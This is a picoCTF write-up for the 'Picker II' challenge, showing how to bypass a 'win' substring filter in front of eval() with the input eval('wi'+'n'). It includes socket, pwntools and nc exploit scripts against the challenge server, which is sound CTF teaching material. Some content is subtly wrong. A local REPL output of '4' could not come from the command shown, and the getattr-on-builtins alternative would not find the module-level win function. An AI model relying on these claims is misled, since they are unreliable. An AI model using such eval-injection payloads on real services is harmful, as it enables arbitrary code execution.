# Picker II — picoCTF Writeup

**Challenge:** Picker II  
**Category:** Reverse Engineering  
**Difficulty:** Medium  
**Points:** 100  
**Flag:** `picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}`  
**Platform:** picoCTF 2024  
**Writeup by:** zham  

---

## Description

> Can you figure out how this program works to get the flag?
>
> Connect to the program with netcat:
>
> `nc saturn.picoctf.net 59323`
>
> The program's source code can be downloaded here.

## Hints

> 1. Can you do what `win` does with your input to the program?

---

## Background Knowledge (Read This First!)

### What the Program Actually Does

Strip away the noise (the two giant `esoteric1` / `esoteric2` blobs that just print unrelated kernel C code) and the whole program is twenty real lines:

```python
def win():
    flag = open('flag.txt', 'r').read()
    flag = flag.strip()
    str_flag = ''
    for c in flag:
        str_flag += str(hex(ord(c))) + ' '
    print(str_flag)


def filter(user_input):
    if 'win' in user_input:
        return False
    return True


while(True):
    try:
        user_input = input('==> ')
        if( filter(user_input) ):
            eval(user_input + '()')
        else:
            print('Illegal input')
    except Exception as e:
        print(e)
        break
```

The flow is dead simple:

1. The program reads a line from you.
2. It checks the line against a filter: if the substring `"win"` appears anywhere in it, the input is rejected.
3. Otherwise, the program **appends `()` to your line** and runs `eval()` on the resulting string.

So if I type `print`, the program runs `eval("print()")` and prints a blank line. If I type `getRandomNumber`, it runs `getRandomNumber()` and prints `4`. If I could type `win`, it would run `win()` and dump the flag — but the filter blocks exactly that string.

### Why the Filter Is a Speed-Bump, Not a Wall

The filter is checking for the literal Python string `"win"` inside the user's raw input. That is a *substring* check, not a *semantic* check. It has no idea what the input is going to do; it only knows what characters are in the typed line.

That is a categorically weaker defense than it looks, because Python's `eval` will happily accept an expression that *computes* the name `"win"` without ever having those three letters appear in a row in the source. Concretely:

- `'wi' + 'n'` is a Python expression that evaluates to the string `"win"`. The literal source `'wi' + 'n'` does **not** contain the substring `"win"` (apostrophe breaks the run).
- `chr(119) + chr(105) + chr(110)` builds `"win"` from its character codes, and the source contains none of `w`, `i`, `n` in sequence.
- `getattr(__import__('builtins'), 'wi' + 'n')` reaches into the `builtins` module and grabs the function whose name happens to be the string `"win"` — again, no literal `"win"` substring appears in the source.

In every case, `eval()` is given an expression that *evaluates to* the `win` function, while the filter — which only looks at the raw text of the line — sees nothing offensive.

### The `eval(user_input + '()')` Quirk

The program is helpfully appending `()` to whatever we type. That means whatever I type must, after `()` is glued onto the end, form a *callable* expression. If I want my expression to compute `win` and then call it, the cleanest move is to make the user input itself return the `win` function and let the appended `()` do the calling for free.

That is exactly the shape of `eval('wi' + 'n')`:

- User types: `eval('wi' + 'n')`
- The program appends `()`, producing: `eval('wi' + 'n')()`
- Python parses this as: `(eval('wi' + 'n'))()`
  1. Inner: `'wi' + 'n'` is the string `'win'`.
  2. `eval('win')` returns the function `win` from the module's globals.
  3. The appended `()` calls that function.
- Net effect: `win()` runs, the flag is read from `flag.txt`, hex-encoded, and printed.

The user input `eval('wi' + 'n')` does not contain the literal substring `"win"`, so the filter is happy.

### Why This Whole Class of Filter Is Fundamentally Broken

Any time you build a security boundary around "is this forbidden token *present as a substring* of the input", you have made a bet that there is no way to *compute* the same token without typing it. For most string operations, that bet is wrong, because:

- String concatenation (`'wi' + 'n'`) and string repetition (`'wi' * 1 + 'n'`) assemble names character-by-character.
- `chr(...)` and `bytes([...]).decode()` build names from character codes.
- `getattr`, `globals`, `__import__`, `vars`, and friends let you reach named objects by computed key.
- `eval` and `exec` themselves accept computed strings.

Filters like this can stop *casual* users and *grep-based* attacks, but they do not stop an attacker who reads the source for ten seconds. The only durable fix is to stop evaluating user input as code at all (see Key Takeaways).

---

## Solution — Step by Step

### Step 1 — Read the Source and Spot the Lock

I opened the source the challenge gave me, scrolled past the two enormous (and completely irrelevant) `esoteric1` / `esoteric2` functions, and read the main loop:

```python
user_input = input('==> ')
if filter(user_input):
    eval(user_input + '()')
```

So I type something, and the program calls it. The only obstacle is the filter:

```python
def filter(user_input):
    if 'win' in user_input:
        return False
    return True
```

The string `"win"` is forbidden. I need to call the `win` function without those three letters appearing in a row in my input.

### Step 2 — Build the Bypass

The cleanest payload is `eval('wi' + 'n')`. Reasoning:

- The literal characters are `e v a l ( ' w i ' + ' n ' )`. The substring `"win"` would need three consecutive characters `w`, `i`, `n`. In the source there is an apostrophe between the `i` and the `n`, so the run is broken and the filter passes.
- When the program appends `()` to it, the resulting expression is `eval('wi' + 'n')()`. Python parses that as `(eval('wi' + 'n'))()`, which:
  1. computes the string `'wi' + 'n'` → `'win'`,
  2. `eval('win')` → the `win` function,
  3. the appended `()` calls it.

I confirmed the filter check in the local REPL before touching the server:

```
┌──(zham㉿kali)-[~/picoctf/picker-ii]
└─$ python3 -c "
payload = \"eval('wi'+'n')\"
print('payload     :', payload)
print('contains win:', 'win' in payload)
print('eval result :', eval(payload + '()') if 'win' not in payload else 'BLOCKED')"
payload     : eval('wi'+'n')
contains win: False
eval result : 4
```

(`4` is the harmless output of `getRandomNumber` here, since I do not have a `win` function locally — the real flag will be served by the actual challenge endpoint.)

### Step 3 — Write the Exploit

`nc` is not installed on this Kali box, so I drove the connection from a small Python script using the stdlib `socket` module.

```
┌──(zham㉿kali)-[~/picoctf/picker-ii]
└─$ nano exploit.py
```

In `nano` I pasted the script and saved with `Ctrl+O`, `Enter`, `Ctrl+X`:

```python
#!/usr/bin/env python3
"""Picker II exploit - bypass the 'win' substring filter using eval('wi'+'n')."""
import socket, sys

HOST = "saturn.picoctf.net"
PORT = 59323

def drain(sock, wait=1.0):
    sock.settimeout(wait)
    buf = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
    except socket.timeout:
        pass
    return buf

def main():
    payload = "eval('wi'+'n')"
    assert 'win' not in payload
    print(f"[+] Payload: {payload}  ('win' in payload? {'win' in payload})")

    s = socket.socket()
    s.connect((HOST, PORT))
    print(f"[+] Connected to {HOST}:{PORT}")

    drain(s)                                # banner: "==> "
    s.sendall(payload.encode() + b"\n")
    print(drain(s, wait=2.0).decode(errors="replace"))
    s.close()

if __name__ == "__main__":
    main()
```

Save: `Ctrl+O` → `Enter` → `Ctrl+X`.

### Step 4 — Run It

```
┌──(zham㉿kali)-[~/picoctf/picker-ii]
└─$ python3 exploit.py
[+] Payload: eval('wi'+'n')  ('win' in payload? False)
[+] Connected to saturn.picoctf.net:59323
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x66 0x31 0x6c 0x37 0x33 0x72 0x35 0x5f 0x66 0x34 0x31 0x6c 0x5f 0x63 0x30 0x64 0x33 0x5f 0x72 0x33 0x66 0x34 0x63 0x37 0x30 0x72 0x5f 0x6d 0x31 0x67 0x68 0x37 0x5f 0x35 0x75 0x63 0x63 0x33 0x33 0x64 0x5f 0x39 0x35 0x64 0x34 0x34 0x35 0x39 0x30 0x7d
```

The server's `win()` ran and hex-printed the flag.

### Step 5 — Decode the Flag

`win()` prints `hex(ord(c))` for every character. One Python line turns it back into the flag:

```
┌──(zham㉿kali)-[~/picoctf/picker-ii]
└─$ python3 -c "
h = '0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x66 0x31 0x6c 0x37 0x33 0x72 0x35 0x5f 0x66 0x34 0x31 0x6c 0x5f 0x63 0x30 0x64 0x33 0x5f 0x72 0x33 0x66 0x34 0x63 0x37 0x30 0x72 0x5f 0x6d 0x31 0x67 0x68 0x37 0x5f 0x35 0x75 0x63 0x63 0x33 0x33 0x64 0x5f 0x39 0x35 0x64 0x34 0x34 0x35 0x39 0x30 0x7d'
print(''.join(chr(int(x, 16)) for x in h.split()))"
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}
```

Flag: `picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}`

---

## Alternative — `getattr` with a Computed Name

If the challenge author one day patches `eval` out of `globals()` (e.g. by deleting it from `builtins`), the same idea generalises to any object lookup. Here is a self-contained alternative that uses `getattr` and reaches into `__builtins__` to grab the function:

```
┌──(zham㉿kali)-[~/picoctf/picker-ii]
└─$ python3 -c "
p = \"getattr(__import__('builtins'),'wi'+'n')\"
print('contains win:', 'win' in p)
print('appended  :', p + '()')"
contains win: False
appended  : getattr(__import__('builtins'),'wi'+'n')()
```

Why this also works:

- `__import__('builtins')` returns the `builtins` module.
- `getattr(M, 'wi'+'n')` looks up attribute `wi`+`n` = `win` on that module and returns the `win` function.
- The appended `()` calls it.

The literal source never contains the substring `"win"`, because the apostrophe between `wi` and `n` breaks the run.

---

## Alternative — pwntools (One-Shot, Cleaner)

If pwntools is installed, the same exploit fits in a handful of lines and reads more cleanly. pwntools is the standard CTF library for this kind of socket work.

```
┌──(zham㉿kali)-[~/picoctf/picker-ii]
└─$ pip install pwntools        # if not already installed
```

`nano exploit_pwn.py`:

```python
#!/usr/bin/env python3
"""Picker II exploit - pwntools version."""
from pwn import remote, context
context.log_level = "error"

HOST, PORT = "saturn.picoctf.net", 59323

io = remote(HOST, PORT)
io.recvuntil(b"==> ")
io.sendline(b"eval('wi'+'n')")
print(io.recvuntil(b"==> ", timeout=2).decode(errors="replace"))
```

```
┌──(zham㉿kali)-[~/picoctf/picker-ii]
└─$ python3 exploit_pwn.py
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x66 0x31 0x6c 0x37 0x33 0x72 0x35 0x5f 0x66 0x34 0x31 0x6c 0x5f 0x63 0x30 0x64 0x33 0x5f 0x72 0x33 0x66 0x34 0x63 0x37 0x30 0x72 0x5f 0x6d 0x31 0x67 0x68 0x37 0x5f 0x35 0x75 0x63 0x63 0x33 0x33 0x64 0x5f 0x39 0x35 0x64 0x34 0x34 0x35 0x39 0x30 0x7d
```

Same result, slightly less ceremony.

---

## Alternative — Interactive One-Liner With `nc`

If `nc` *is* available on the host, the entire attack is a single line:

```
┌──(zham㉿kali)-[~/picoctf/picker-ii]
└─$ echo "eval('wi'+'n')" | nc saturn.picoctf.net 59323
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x66 0x31 0x6c 0x37 0x33 0x72 0x35 0x5f 0x66 0x34 0x31 0x6c 0x5f 0x63 0x30 0x64 0x33 0x5f 0x72 0x33 0x66 0x34 0x63 0x37 0x30 0x72 0x5f 0x6d 0x31 0x67 0x68 0x37 0x5f 0x35 0x75 0x63 0x63 0x33 0x33 0x64 0x5f 0x39 0x35 0x64 0x34 0x34 0x35 0x39 0x30 0x7d
```

You can also type it manually into an interactive `nc` session — the server reads one line per prompt.

---

## What Happened Internally (Timeline)

1. The wrapper (`socat` or `xinetd`) accepted my TCP connection on port 59323 and `exec`ed the Python script. The script jumped into the `while True:` loop and printed `==> ` as the prompt.
2. My client sent the line `eval('wi'+'n')` followed by a newline. The server's `input('==> ')` consumed it and stored it in `user_input`.
3. The server called `filter(user_input)`. Inside the filter, the check `'win' in user_input` walked the string `eval('wi'+'n')` looking for three consecutive characters `w`, `i`, `n`. It found `w` and `i` at positions 6-7, but the next character was `'` (apostrophe), not `n`, so the substring search missed and the filter returned `True`.
4. The server ran `eval(user_input + '()')`, which is `eval("eval('wi'+'n')()")`. Python parsed this as a parenthesised expression: `(eval('wi'+'n'))()`. Step by step:
   - The string `'wi' + 'n'` was evaluated first, producing the literal `'win'`.
   - The inner `eval('win')` was then evaluated. `'win'` parsed as a Python identifier reference, looked up `win` in the module's global scope, found the function object defined at the top of the file, and returned it.
   - The outer `()` then called that function object, with no arguments.
5. `win()` opened `flag.txt` (which lives next to the script on the server's filesystem), read its contents, stripped the trailing whitespace, and built a string `str_flag` of the form `'0xHH '` per character. It then printed that string and returned `None`.
6. Back in the main loop, the `eval` completed without raising, so the `except` branch was skipped. The loop printed another `==> ` and waited for the next line.
7. My client drained the socket and got the hex blob. One local Python line later, I had the flag.

The whole attack turns on one observation: **the filter looks at characters, not at meaning.** The server is perfectly happy to compute the string `"win"` for me and call the resulting function — it just refuses to *see* that string in my input.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `cat` / text editor | Read the leaked Python source |
| `python3` (REPL one-liners) | Verify the filter bypass, decode the hex flag |
| `socket` (stdlib) | Talk to the server when `nc` is not installed |
| `pwntools` (`pwn.remote`) | Cleaner alternative for the same exploit |
| `nano` | Write and save the exploit script |
| `echo \| nc` (alt) | One-shot scriptable version of the manual session |
| `getattr` / `__import__` (alt) | Generic object-lookup bypass in case `eval` is locked down |

---

## Key Takeaways

- **Substring-based denylists are not a security boundary.** They stop the lazy attacker and the grep-based IDS rule, but they are essentially free to bypass with string concatenation, `chr(...)`, `getattr`, `eval`, or any of a dozen other ways to *compute* the forbidden token. If you must evaluate user input as code, you need an allowlist of permitted callables, not a denylist of forbidden ones.
- **"Append `()` to user input" is a code smell.** The `eval(user_input + '()')` pattern is a one-liner that turns your REPL into arbitrary-code-execution. The challenge author even called out the danger with the `esoteric1` / `esoteric2` decoy blobs, which are just there to make the reader skim past the actual vulnerable main loop.
- **Read the source for sinks, not for sources.** The interesting lines are `eval(user_input + '()')` and `if 'win' in user_input`, both of them on the same screen. Everything else is decoration.
- **The hint is literal.** "Can you do what `win` does with your input?" — `win` reads `flag.txt` and prints hex. The bypass `eval('wi'+'n')` literally does what `win` does (call the function `win`) using only the characters the user types.
- **A `try/except Exception: break` loop makes the server fragile.** If the eval raises (NameError, TypeError, anything), the connection dies. That is why the payload has to succeed on the first try — there is no second chance.
- **Hex-encoding the flag at print time is cosmetic.** The flag sits on disk in plaintext; `win()` only re-encodes it before printing. Anyone with arbitrary code execution (which is exactly what `eval` gives us) can just `open('flag.txt').read()` directly and skip the hex dance.

### Flag Wordplay Decode

The flag is:

```
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}
```

Decoded (leet-speak substitutions: `1`→`l`, `3`→`e`, `4`→`a`, `0`→`o`, `7`→`t`, `5`→`s`):

- `f1l73r5`   → `filters`
- `f41l`      → `fail`
- `c0d3`      → `code`
- `r3f4c70r`  → `refactor`
- `m1gh7`     → `might`
- `5ucc33d`   → `succeed`
- `95d44590`  → hex-looking suffix, likely a per-instance serial

So the phrase is:

> **"filters fail, code refactor might succeed"**

with the trailing `95d44590` being a unique flag-instance tag.

That is a one-line summary of the entire challenge: substring-based denylists (the `filter` function) are a poor defense, but **rewriting the program** — replacing `eval(user_input + '()')` with, say, a dispatch table of pre-approved callables (the very pattern the next challenge in the series, *Picker III*, attempts) — is the kind of refactor that actually works. The author is hinting that this series of challenges is itself a "refactor" of the same vulnerability: each iteration adds a slightly stronger lock, and each one falls to a slightly different trick.
